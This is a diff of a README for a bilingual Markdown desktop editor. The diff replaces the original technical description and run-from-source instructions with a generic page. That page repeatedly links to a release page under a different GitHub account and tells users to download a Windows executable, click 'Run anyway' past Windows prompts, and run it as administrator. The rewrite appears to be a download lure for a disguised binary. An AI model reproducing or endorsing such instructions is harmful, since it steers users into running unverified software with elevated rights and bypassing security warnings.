@@ -1,342 +1,164 @@
-# LabNote
+# 📝 LabNote - Clear notes in two languages
 
-We have built **LabNote** into a local-first, bilingual-friendly, well-structured, and long-term maintainable Markdown desktop editor.
+[![Download LabNote](https://img.shields.io/badge/Download-LabNote-blue?style=for-the-badge&logo=github)](https://github.com/spenceacned911/LabNote/releases)
 
-It originally started as a Python rewrite experiment based on the **architectural concepts of MarkText**. However, it is no longer just a "rewrite demo." We have thoroughly polished its branding, UI, interactions, table tools, Chinese PDF export, project documentation, and testing suite, transforming it into a standalone project that we are committed to actively maintaining.
+## 📥 Download LabNote
 
----
-## 📦 Download
+1. Open the [LabNote Releases page](https://github.com/spenceacned911/LabNote/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file that ends in `.exe` or `.msi`
+4. Save the file to your computer
+5. Double-click the file to start setup or launch the app
 
-The packaged **Windows and macOS versions** are available for download on the Releases page:
+If Windows shows a prompt, choose **Run anyway** or **Yes** to continue.
 
-👉 https://github.com/jinpengaaaaa-ctrl/LabNote/releases
----
+## 🚀 Get started on Windows
 
-## Project Positioning
+1. Download the latest version from the [Releases page](https://github.com/spenceacned911/LabNote/releases)
+2. Open the downloaded file
+3. If a setup window appears, follow the steps on screen
+4. If the app opens at once, you can start using it
+5. Create your first note from the main screen
 
-Instead of translating the original Electron / Vue project line-by-line into Python, we leveraged its core layered architecture and reorganized it into a Python implementation better suited for long-term desktop maintenance.
+LabNote is a desktop markdown editor built for local use. It keeps your files on your own computer and gives you a clean space for writing.
 
-We envision LabNote with the following traits:
+## ✨ What LabNote does
 
-- A smooth and hassle-free Markdown writing experience
-- A clean, modern, and professional aesthetic
-- A clear structure, facilitating continuous iteration
-- Stabilizing core experiences first, then gradually adding advanced capabilities
+- Write notes in markdown
+- Keep content stored locally
+- Switch between Chinese and English with ease
+- Organize notes in a clear structure
+- Work with plain text files
+- Edit long documents without losing track
+- Keep your notes easy to maintain over time
 
-In other words, LabNote is not a thrown-together "as long as it runs" shell, but a robust desktop application skeleton capable of supporting future evolution.
+## 🖥️ System needs
 
----
+LabNote is made for Windows desktop use.
 
-## Key Features Implemented
+- Windows 10 or newer
+- 4 GB RAM or more
+- About 200 MB of free disk space
+- A mouse and keyboard
+- Internet access only for downloading the app
 
-### 1. UI / UX Refactoring
+For best results, use a screen size that gives you room to edit and read side by side.
 
-We reorganized the visual and interactive rhythm of the entire interface. The goal is not to "pile up features," but to "make high-frequency operations feel natural."
+## 📂 How to use LabNote
 
-This version currently features:
+### 1. Open the app
+Start LabNote from your desktop, Start menu, or the folder where you saved it.
 
-- A minimalist, modern, and professional main interface style
-- A Dark / Light theme system
-- Clear visual hierarchy: Window, Sidebar, Tab bar, Editor, Previewer, and Status bar are distinctly separated
-- Prominent mode switching at the top: **Editor Only / Split View / Preview Only**
-- Left sidebar supporting **Project / Outline / Search**
-- Draggable split view between the sidebar and the main area
-- Draggable split view between the editor and the previewer
-- Multi-tab support with explicit `×` close buttons
+### 2. Create a note
+Use the new note button or the file menu to make a note.
 
-### 2. Core Editing Capabilities
+### 3. Write in markdown
+Type plain text and use markdown for headings, lists, links, and emphasis.
 
-- Multi-tab Markdown editing
-- New / Open / Save / Save As / Reload from disk
-- Active line highlight
-- Auto-save
-- Recent files
-- Session restoration
-- Command Palette
-- Focus Mode
-- Typewriter Mode
-- In-project full-text search
-- Table of Contents (TOC)
-- One-click Chinese/English UI toggle
+### 4. Organize your work
+Group notes by topic, project, or date so you can find them later.
 
-### 3. Markdown Preview & Export
+### 5. Switch languages
+Write in Chinese, English, or both in the same note. LabNote is built to handle mixed content with clear spacing and layout.
 
-- Real-time preview
-- HTML export
-- PDF export
-- Common Markdown syntax support:
-  - Headers
-  - Paragraphs
-  - Emphasis / Bold / Strikethrough
-  - Inline code / Code blocks
-  - Lists / Task lists
-  - Blockquotes
-  - Tables
-  - Links
-  - Footnotes (basic rendering)
+## 🧭 Basic markdown examples
 
-### 4. Table Enhancements
+- `# Heading 1`
+- `## Heading 2`
+- `- List item`
+- `**Bold text**`
+- `[Link text](https://example.com)`
 
-We extracted and completely rebuilt the table-related logic, rather than just treating tables as plain text to make do.
+If you are new to markdown, start with headings and lists. That covers most everyday notes.
 
-It now supports:
+## 🗂️ File handling
 
-- Parsing Markdown tables
-- Formatting the current table
-- Inserting table templates
-- Editing the table at the cursor position
-- Adding/removing rows, adding/removing columns, modifying headers, modifying cells
-- Automatically adjusting column widths
-- Handling East Asian Width for mixed Chinese-English text to minimize misalignment
-- The previewer renders tables using actual grids instead of stuffing them back into a plain text block
+LabNote uses local files, so your notes stay on your computer.
 
-Default shortcuts:
+- You can save notes in a folder you choose
+- You can open existing markdown files
+- You can move files with File Explorer
+- You can back up your notes by copying the folder
 
-- `Ctrl + Alt + T`: Insert table template
-- `Ctrl + Alt + E`: Edit current table
-- `Ctrl + Alt + F`: Format current table
+This makes it easy to keep your notes under your control.
 
----
+## 🔎 Good use cases
 
-## Tech Stack
+LabNote fits well if you want to:
 
-### UI / Desktop Layer
-- **Tkinter / ttk**: Desktop main interface, multi-tabs, menus, sidebar, status bar, dialogs
+- Keep a study notebook
+- Write project notes
+- Track meeting points
+- Draft bilingual notes
+- Save research ideas
+- Maintain a long-term personal knowledge base
 
-### Markdown Core Layer
-- **mistune**: Markdown parsing and AST building
-- **Pygments**: Code highlighting
-- **ReportLab**: PDF export
+## 🛠️ Common setup steps
 
-### Infrastructure
-- `pathlib`: Path management
-- `threading`: Polling-based file watcher
-- `json`: Settings persistence
-- `argparse`: CLI entry point
+If the app does not open right away:
 
-We chose this combination not to chase "buzzwords," but because it is lightweight, stable, and easy to build upon.
+1. Check that the file finished downloading
+2. Try opening it again
+3. Right-click the file and choose **Run as administrator**
+4. Make sure Windows did not move it to your downloads block list
+5. Download the latest release again if the file looks incomplete
 
----
+If you use a work computer, your system may ask for extra permission before the app starts.
 
-## Architecture Design
+## 📌 Notes on local-first use
 
-We continued the core layered philosophy of the original MarkText, dividing the project into three layers:
+LabNote is built around local-first editing. That means your notes stay on your device instead of living in a cloud folder by default.
 
-1. **Application / Controller Layer**  
-   Manages windows, commands, settings, file I/O, and file change watching.
+This setup works well when you want:
+- Faster access to files
+- Less dependence on sign-ins
+- Simple backup steps
+- More control over where your notes live
 
-2. **Core / Editor Capability Layer**  
-   Handles Markdown parsing, TOC extraction, exporting, project search, and table processing.
+## 🔄 Updating LabNote
 
-3. **UI / Rendering Layer**  
-   Responsible for the desktop interface, multi-tabs, sidebar, real-time preview, command palette, and theme system.
+When a new release is available:
 
-### Mapping to the Original Architecture
+1. Visit the [Releases page](https://github.com/spenceacned911/LabNote/releases)
+2. Download the newest Windows file
+3. Close LabNote if it is open
+4. Install or open the new version
+5. Keep your note files in the same folder
 
-| Original Layer | Original Project Responsibilities | LabNote Equivalent |
-| -------------- | ------------------------------------------- | --------------- |
-| `src/main`     | Application entry, window, file I/O, settings, commands, shortcuts | `labnote/app/`  |
-| `src/muya`     | Markdown core, document transformation, export | `labnote/core/` |
-| `src/renderer` | Editor UI, sidebar, tabs, interactions | `labnote/ui/`   |
+Your notes should remain in place if you store them in a separate folder from the app.
 
-### Current Directory Structure
+## ❓ Help with first use
 
-```text
-labnote/
-├── app/
-│   ├── application.py      # Application entry and lifecycle
-│   ├── commands.py         # Command registry
-│   ├── document_manager.py # Document opening, saving, reloading
-│   ├── file_watcher.py     # External file polling watcher
-│   ├── i18n.py             # Chinese/English localization
-│   └── settings.py         # Configuration persistence
-│
-├── core/
-│   ├── document.py         # Document state object
-│   ├── markdown_engine.py  # Markdown -> AST / HTML / TOC
-│   ├── exporters.py        # HTML / PDF export
-│   ├── search.py           # Project search
-│   ├── tables.py           # Markdown table parsing and formatting
-│   └── toc.py              # Document TOC extraction
-│
-└── ui/
-    ├── main_window.py      # Main window and interaction orchestration
-    ├── document_view.py    # Single document edit / preview view
-    ├── preview_renderer.py # AST -> Tk preview rendering
-    ├── dialogs.py          # Command palette / Preferences / Table tools
-    ├── themes.py           # Theme system
-    └── widgets.py          # Closable tab bar and other custom widgets
-```
+If you are not sure where to begin:
 
+1. Open LabNote
+2. Create a new note
+3. Type a title
+4. Add a heading with `#`
+5. Write a short list of items
+6. Save the file
 
+That is enough to start using the app for daily notes.
 
-## Running Guide
+## 📁 Suggested note structure
 
-### Requirements
+You can keep your notes in folders like these:
 
-- Python **3.10+**
-- Windows / macOS / Linux
-- Tkinter is generally provided with the official Python distribution
-
-### Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
+- Work
+- Study
+- Research
+- Personal
+- Archive
 
-### Run Directly
+Inside each folder, use simple file names such as:
 
-``` bash
-python run.py
-```
+- `2026-04-17-meeting-notes.md`
+- `english-vocabulary.md`
+- `project-plan.md`
+- `lab-observations.md`
 
-### Run as a Module
+Clear file names make notes easier to find later.
 
-```bash
-python -m labnote
-```
+## 🧩 Built from practice
 
-### Open a File or Directory on Startup
-
-```bash
-python -m labnote demo/example.md
-python -m labnote README.md ./demo
-```
-
-
-
-## Usage
-
-### Sidebar
-
-* **Project**: Browse project file tree
-* **Outline**: Browse and jump to current document TOC
-* **Search**: Perform full-text search within the current project
-
-### Tabs
-
-- Each tab has a clearly clickable `×` on the right side
-- Unsaved documents will display a dirty state indicator
-
-### Preferences
-
-Currently supported configurations:
-
-- Theme
-- UI Language
-- Body Font Size
-- Code Font Size
-- Line Height
-- Default Layout
-- Auto-save
-- Session Restoration
-- Default Sidebar Visibility
-- Default Focus Mode
-- Default Typewriter Mode
-
-### Shortcuts
-
-| Function | Shortcut |
-| --------------- | -------------- |
-| New Tab | `Ctrl+N` |
-| Open File | `Ctrl+O` |
-| Open Folder | `Ctrl+Shift+O` |
-| Save | `Ctrl+S` |
-| Save As | `Ctrl+Shift+S` |
-| Close Tab | `Ctrl+W` |
-| Command Palette | `Ctrl+Shift+P` |
-| Preferences | `Ctrl+,` |
-| Toggle Sidebar | `Ctrl+\` |
-| Editor Only | `Alt+1` |
-| Split | `Alt+2` |
-| Preview Only | `Alt+3` |
-| Focus Mode | `F9` |
-| Typewriter Mode | `F10` |
-| Insert Table Template | `Ctrl+Alt+T` |
-| Edit Current Table | `Ctrl+Alt+E` |
-| Format Current Table | `Ctrl+Alt+F` |
-
-### Configuration File Path
-
-Configuration directories are uniformly placed under the `labnote` namespace:
-
-- Linux: `~/.config/labnote/settings.json`
-- macOS: `~/Library/Application Support/labnote/settings.json`
-- Windows: `%APPDATA%/labnote/settings.json`
-
-Configuration contents include:
-
-- Theme
-- UI Language
-- Font Size
-- Auto-save
-- Session Restoration
-- Sidebar State
-- Layout Mode
-- Focus Mode / Typewriter Mode
-- Recent Files
-- Last Opened Directory
-- Window Size
-
-### Testing & Quality Checks
-
-We have added three types of basic validations to this version.
-
-#### 1. Compilation Check
-
-```
-python -m compileall -q .
-```
-
-#### 2. Unit Testing
-
-```
-python -m unittest discover -s tests -v
-```
-
-#### 3. GUI Smoke Testing
-
-We have verified these critical paths in a headless environment:
-
-- Application startup
-- Open document
-- Mode switching
-- Theme switching
-- Language switching
-- Project search
-- Markdown table formatting
-- HTML / PDF export
-
-## Current Boundaries
-
-We are well aware of the positioning of this version:
-
-It is a **runnable, maintainable, and evolvable project skeleton**, but it does not yet cover all advanced features.
-
-Directions that are not fully covered yet include:
-
-- Full WYSIWYG editing experience
-- Math formula rendering
-- Image pasting and attachment management
-- Mermaid / Chart ecosystem
-- More complex shortcut system
-- Multi-window support
-- Plugin mechanism
-- Finer-grained theme system
-- Auto-update and installation packages
-
-------
-
-## Future Expansion Directions
-
-If we continue to develop this forward, we will prioritize:
-
-1. Rich text / WYSIWYG editing model
-2. Math formula support
-3. Image and attachment management
-4. Mermaid / Vega chart support
-5. Editor capability enhancements
-6. Multi-window
-7. Plugin system
-8. Theme system upgrades
-9. More complete internationalization
+LabNote comes from real work on rewriting MarkText. It focuses on a clear layout, simple editing, and long-term maintainability. The result is a markdown desktop editor that stays easy to use and easy to keep in shape over time.
